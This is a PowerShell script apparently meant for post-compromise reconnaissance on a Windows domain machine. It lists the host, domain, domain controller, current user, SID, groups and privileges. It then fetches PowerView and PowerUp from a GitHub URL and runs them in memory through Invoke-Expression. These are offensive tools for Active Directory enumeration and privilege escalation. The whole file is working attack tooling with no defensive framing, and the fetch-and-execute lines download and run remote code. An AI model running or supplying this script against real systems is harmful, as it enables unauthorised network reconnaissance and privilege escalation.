## Computer information
$computerName = $env:COMPUTERNAME
$localIP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Wi-Fi'}).IPAddress
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
$domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetDirectoryContext()
$domainController = ([System.DirectoryServices.ActiveDirectory.DomainController]::FindOne($domainContext)).Name

## User information
$windowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$userName = $windowsIdentity.Name
$sid = $windowsIdentity.User.Value
$groups = $windowsIdentity.Groups | ForEach-Object {$_.Translate([System.Security.Principal.NTAccount]).Value}
$objectSecurity = (Get-Acl 'C:\').GetObjectSecurity()
$privileges = [System.Enum]::GetValues([System.Security.AccessControl.PrivilegeType]) | ForEach-Object {
    if ($objectSecurity.AccessCheck('Everyone', $_, $false)) {
        $_.ToString()
    }
}

Write-Host "`n"
Write-Host "## Computer information"
Write-Host "Hostname: $computerName"
Write-Host "Local IP address: $localIP"
Write-Host "Domain: $domain"
Write-Host "Domain Controller: $domainController"

Write-Host "`n"
Write-Host "## User information"
Write-Host "Current user: $userName"
Write-Host "SID: $sid"
Write-Host "`n"
Write-Host "Groups:`n$($groups -join "`n")"
Write-Host "`n"
Write-Host "Privileges:`n$($privileges -join "`n")"

Write-Host "`n"
Write-Host "Importing powerview and powerup modules"
## Import powerview and powerup modules
try {
    $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerView.ps1' -UseBasicParsing
    Invoke-Expression $($pwContent.Content)
    Import-Module PowerView
    Write-Output "Powerview loaded"
} catch {
    Write-Output "Could not load Powerview: $($_.Exception.Message)"
}

try {
    $puContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerUp.ps1' -UseBasicParsing
    Invoke-Expression $($puContent.Content)
    Import-Module PowerUp
    Write-Output "PowerUp loaded"
} catch {
    Write-Output "Could not load PowerUp: $($_.Exception.Message)"
}
